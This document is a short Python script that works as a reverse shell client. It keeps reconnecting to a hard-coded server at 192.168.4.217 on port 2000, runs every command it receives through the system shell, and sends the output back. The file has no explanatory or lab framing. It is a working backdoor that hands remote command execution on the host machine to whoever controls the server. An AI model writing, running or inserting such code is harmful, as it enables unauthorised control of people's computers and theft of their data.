import socket
import subprocess
import time

def main():
    server_ip = "192.168.4.217"
    port = 2000
    username = "me"

    while True:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            print("Attempting to connect to the server...")
            client_socket.connect((server_ip, port))
            print("Connected to the server!")

            client_socket.send(username.encode())

            while True:
                # Receive the command from the server
                command = client_socket.recv(1024).decode()

                if command.lower() == "exit":
                    print("Closing connection...")
                    break

                # Execute the command and capture the output
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                except Exception as e:
                    output = f"Error executing command: {e}"

                # Send the output back to the server
                client_socket.send(output.encode())

        except Exception as e:
            print(f"Failed to connect: {e}")
            print("Retrying in 5 seconds...")
            time.sleep(5)
        finally:
            client_socket.close()

if __name__ == "__main__":
    main()
